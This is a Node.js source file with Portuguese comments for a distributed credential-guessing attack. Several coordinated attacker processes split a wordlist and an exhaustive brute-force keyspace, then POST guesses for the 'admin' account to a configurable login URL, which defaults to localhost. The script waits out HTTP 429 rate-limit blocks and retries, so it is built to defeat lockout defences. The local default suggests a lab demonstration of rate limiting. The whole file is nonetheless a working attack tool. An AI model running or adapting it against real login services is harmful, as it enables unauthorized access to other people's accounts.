const fs   = require("fs");
const path = require("path");

const CHARSET  = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
const USERNAME = "admin";
const LOG_EVERY = 200;

// ─────────────────────────────────────────────
// CONFIGURAÇÃO VIA VARIÁVEIS DE AMBIENTE
// ─────────────────────────────────────────────
const TOTAL_ATTACKERS = parseInt(process.env.TOTAL_ATTACKERS ?? "1");
const ATTACKER_INDEX  = parseInt(process.env.ATTACKER_INDEX  ?? "0");
const SERVER_URL      = process.env.SERVER_URL  || "http://localhost:3000/login";
const ATTACKER_ID     = process.env.ATTACKER_ID || "local";
const WORDLIST_PATH   = process.env.WORDLIST_PATH || path.join(__dirname, "wordlist.txt");

// MODE controla o comportamento do atacante:
//   hybrid     → dicionário primeiro, depois força bruta (padrão)
//   dictionary → só dicionário
//   brute      → só força bruta
const MODE = process.env.MODE || "hybrid";

// ─────────────────────────────────────────────
// CONVERSÃO ÍNDICE ↔ SENHA (força bruta)
// ─────────────────────────────────────────────

function countForLength(len) {
  return BigInt(CHARSET.length) ** BigInt(len);
}

function offsetForLength(len) {
  let total = 0n;
  for (let i = 1; i < len; i++) total += countForLength(i);
  return total;
}

function indexToPassword(globalIndex) {
  let idx  = BigInt(globalIndex);
  const base = BigInt(CHARSET.length);

  let len = 1;
  while (true) {
    const count = countForLength(len);
    if (idx < count) break;
    idx -= count;
    len++;
  }

  const chars = [];
  for (let i = 0; i < len; i++) {
    chars.unshift(CHARSET[Number(idx % base)]);
    idx /= base;
  }

  return chars.join("");
}

function getRangeForLength(len) {
  const total       = countForLength(len);
  const perAttacker = total / BigInt(TOTAL_ATTACKERS);
  const remainder   = total % BigInt(TOTAL_ATTACKERS);
  const idx         = BigInt(ATTACKER_INDEX);

  const start = idx * perAttacker + (idx < remainder ? idx : remainder);
  const extra  = idx < remainder ? 1n : 0n;
  const end    = start + perAttacker + extra - 1n;

  return { start, end };
}

// ─────────────────────────────────────────────
// CARREGAMENTO DA WORDLIST
// ─────────────────────────────────────────────

function loadWordlist() {
  try {
    const content = fs.readFileSync(WORDLIST_PATH, "utf8");
    const words   = content
      .split("\n")
      .map(w => w.trim())
      .filter(w => w.length > 0);

    console.log(`[#${ATTACKER_ID}] Wordlist carregada: ${words.length} senhas de "${WORDLIST_PATH}"`);
    return words;
  } catch (err) {
    console.warn(`[#${ATTACKER_ID}] Wordlist não encontrada em "${WORDLIST_PATH}" — pulando dicionário.`);
    return [];
  }
}

// Divide a wordlist entre os atacantes para não repetirem senhas
function getWordlistSlice(words) {
  const total      = words.length;
  const perAttacker = Math.floor(total / TOTAL_ATTACKERS);
  const remainder  = total % TOTAL_ATTACKERS;

  const start = ATTACKER_INDEX * perAttacker + Math.min(ATTACKER_INDEX, remainder);
  const extra  = ATTACKER_INDEX < remainder ? 1 : 0;
  const end    = start + perAttacker + extra;

  return words.slice(start, end);
}

// ─────────────────────────────────────────────
// UTILITÁRIOS
// ─────────────────────────────────────────────

function formatTime(ms) {
  if (ms < 1000) return `${ms}ms`;
  if (ms < 60000) return `${(ms / 1000).toFixed(2)}s`;
  const m = Math.floor(ms / 60000);
  const s = String(Math.floor((ms % 60000) / 1000)).padStart(2, "0");
  return `${m}m${s}s`;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function tryLogin(password) {
  const response = await fetch(SERVER_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: USERNAME, password })
  });
  const data = await response.json();
  return { response, data };
}

// Tenta uma senha e retorna true se encontrou, false caso contrário
// Cuida automaticamente do bloqueio 429
async function attempt(password, totalAttempts, startTime) {
  while (true) {
    try {
      const { response, data } = await tryLogin(password);
      const elapsed = Date.now() - startTime;
      const rate    = Math.round(totalAttempts / (elapsed / 1000)) || 0;

      if (totalAttempts % LOG_EVERY === 0 || data.success || response.status === 429) {
        console.log(
          `[#${ATTACKER_ID}][${String(totalAttempts).padStart(7)}]  "${password}"` +
          `  HTTP ${response.status}  ${formatTime(elapsed)}  ${rate} t/s`
        );
      }

      if (data.success) return { found: true, password };

      if (response.status === 429) {
        const waitMs = (data.remainingBlockMs || 15000) + 500;
        console.log(`\n[#${ATTACKER_ID}][BLOQUEIO] Aguardando ${Math.ceil(waitMs / 1000)}s...`);
        await sleep(waitMs);
        console.log(`[#${ATTACKER_ID}][RETOMANDO]\n`);
        continue; // retenta a mesma senha
      }

      return { found: false };
    } catch (err) {
      console.error(`\n[#${ATTACKER_ID}] Erro de conexão:`, err.message);
      console.error("Verifique se o servidor está rodando.\n");
      return { found: false, error: true };
    }
  }
}

function printFound(password, totalAttempts, startTime, phase) {
  const elapsed = Date.now() - startTime;
  const rate    = Math.round(totalAttempts / (elapsed / 1000));

  console.log(`\n${"=".repeat(56)}`);
  console.log(`  [#${ATTACKER_ID}] SENHA ENCONTRADA: "${password}"`);
  console.log(`  Fase:          ${phase}`);
  console.log(`  Comprimento:   ${password.length} caractere${password.length !== 1 ? "s" : ""}`);
  console.log(`  Tentativas:    ${totalAttempts.toLocaleString("pt-BR")}`);
  console.log(`  Tempo total:   ${formatTime(elapsed)}`);
  console.log(`  Taxa média:    ${rate} tentativas/segundo`);
  console.log(`${"=".repeat(56)}\n`);
}

// ─────────────────────────────────────────────
// FASE 1 — ATAQUE POR DICIONÁRIO
// ─────────────────────────────────────────────

async function dictionaryAttack(startTime, initialAttempts = 0) {
  const words = loadWordlist();
  if (words.length === 0) return { found: false, attempts: 0 };

  const slice = getWordlistSlice(words);
  let attempts = initialAttempts;

  console.log(`\n${"─".repeat(56)}`);
  console.log(`  [#${ATTACKER_ID}] FASE 1 — DICIONÁRIO`);
  console.log(`  Testando ${slice.length} senhas (faixa ${ATTACKER_INDEX + 1}/${TOTAL_ATTACKERS})`);
  console.log(`${"─".repeat(56)}\n`);

  for (const password of slice) {
    attempts++;
    const result = await attempt(password, attempts, startTime);

    if (result.error) return { found: false, attempts };
    if (result.found) {
      printFound(password, attempts, startTime, "Dicionário");
      return { found: true, attempts };
    }
  }

  console.log(`\n[#${ATTACKER_ID}] Dicionário esgotado sem sucesso. Partindo para força bruta...\n`);
  return { found: false, attempts };
}

// ─────────────────────────────────────────────
// FASE 2 — FORÇA BRUTA EXAUSTIVA
// ─────────────────────────────────────────────

async function bruteForceAttack(startTime, initialAttempts = 0) {
  let attempts = initialAttempts;

  console.log(`\n${"─".repeat(56)}`);
  console.log(`  [#${ATTACKER_ID}] FASE 2 — FORÇA BRUTA`);
  console.log(`  Atacante ${ATTACKER_INDEX + 1} de ${TOTAL_ATTACKERS}`);
  console.log(`${"─".repeat(56)}\n`);

  for (let len = 1; ; len++) {
    const { start, end } = getRangeForLength(len);
    const rangeSize = end - start + 1n;

    console.log(
      `\n── [#${ATTACKER_ID}] Comprimento ${len} ──` +
      `  faixa ${start}–${end}  (${rangeSize.toLocaleString("pt-BR")} combinações)`
    );

    for (let localIdx = start; localIdx <= end; localIdx++) {
      const globalIdx = offsetForLength(len) + localIdx;
      const password  = indexToPassword(globalIdx);

      attempts++;
      const result = await attempt(password, attempts, startTime);

      if (result.error) return { found: false, attempts };
      if (result.found) {
        printFound(password, attempts, startTime, "Força Bruta");
        return { found: true, attempts };
      }

      // Se foi bloqueado (429), o attempt() já esperou — mas o localIdx
      // não deve avançar, então decrementamos para retentar a mesma senha
      // (o attempt() já faz o retry interno, então isso não é necessário aqui)
    }

    console.log(`   [#${ATTACKER_ID}] Comprimento ${len} esgotado.`);
  }
}

// ─────────────────────────────────────────────
// MAIN
// ─────────────────────────────────────────────

async function main() {
  console.log(`\n${"=".repeat(56)}`);
  console.log(`   ATACANTE #${ATTACKER_ID} — FORÇA BRUTA DISTRIBUÍDA`);
  console.log(`${"=".repeat(56)}`);
  console.log(`Servidor:        ${SERVER_URL}`);
  console.log(`Usuário:         ${USERNAME}`);
  console.log(`Charset:         ${CHARSET.length} caracteres (A-Z a-z 0-9)`);
  console.log(`Este atacante:   ${ATTACKER_INDEX + 1} de ${TOTAL_ATTACKERS}`);
  console.log(`Modo:            ${MODE}`);
  console.log(`${"=".repeat(56)}\n`);

  const startTime = Date.now();
  let attempts    = 0;

  if (MODE === "dictionary") {
    await dictionaryAttack(startTime);

  } else if (MODE === "brute") {
    await bruteForceAttack(startTime);

  } else {
    // hybrid: dicionário primeiro, depois força bruta
    const dict = await dictionaryAttack(startTime, attempts);
    if (dict.found) return;
    attempts = dict.attempts;
    await bruteForceAttack(startTime, attempts);
  }
}

main().catch(console.error);